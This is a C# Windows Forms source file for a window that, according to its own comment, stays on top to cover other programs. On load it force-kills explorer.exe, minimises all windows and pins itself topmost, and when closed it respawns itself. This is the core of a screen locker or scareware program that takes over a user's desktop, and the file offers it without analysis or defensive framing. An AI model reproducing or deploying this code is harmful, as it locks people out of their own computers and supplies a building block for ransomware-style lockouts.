// Created by Hakuryuu (dev@hakuryuu.net)
// 04/2022
// 
// This is the backround View, its set always on top to cover the other Programs :)

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace kekw
{
    public partial class BG_MAIN : Form
    {
        public static int TIME = 60;
        public static int amount = 0;

        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private const UInt32 SWP_NOSIZE = 0x0001;
        private const UInt32 SWP_NOMOVE = 0x0002;
        private const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        const int WM_COMMAND = 0x111;
        const int MIN_ALL = 419;
        const int MIN_ALL_UNDO = 416;

        public BG_MAIN()
        {
            InitializeComponent();
        }
        public BG_MAIN(bool load)
        {
            if (load)
            {
                onlyTwice();
            }
        }

        private void BG_MAIN_Load(object sender, EventArgs e)
        {
            Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM explorer.exe");
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
            System.Threading.Thread.Sleep(2000);
            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
            Form1 _f = new Form1();
            _f.ShowDialog();
        }

        public void onlyTwice()
        {
            if (amount < 1)
            {
                //Screen primaryFormScreen = Screen.FromControl(this);
                ////Use this if you are looking for secondary screen that is not primary
                //Screen secondaryFormScreen = Screen.AllScreens.FirstOrDefault(s => !s.Equals(primaryFormScreen)) ?? primaryFormScreen;
                //BG_MAIN main2 = new BG_MAIN();
                //main2.StartPosition = FormStartPosition.Manual;
                //main2.Location = secondaryFormScreen.Bounds.Location;
                //Point p = new Point(secondaryFormScreen.Bounds.Location.X, secondaryFormScreen.Bounds.Location.Y);
                //main2.Location = p;
                //main2.Show();
                amount++;
            }
        }

        private void BG_MAIN_FormClosing(object sender, FormClosingEventArgs e)
        {
            BG_MAIN m = new BG_MAIN(); 
            m.Show();
        }

        public static void Close()
        {
            Environment.Exit(0);
        }
    }
}
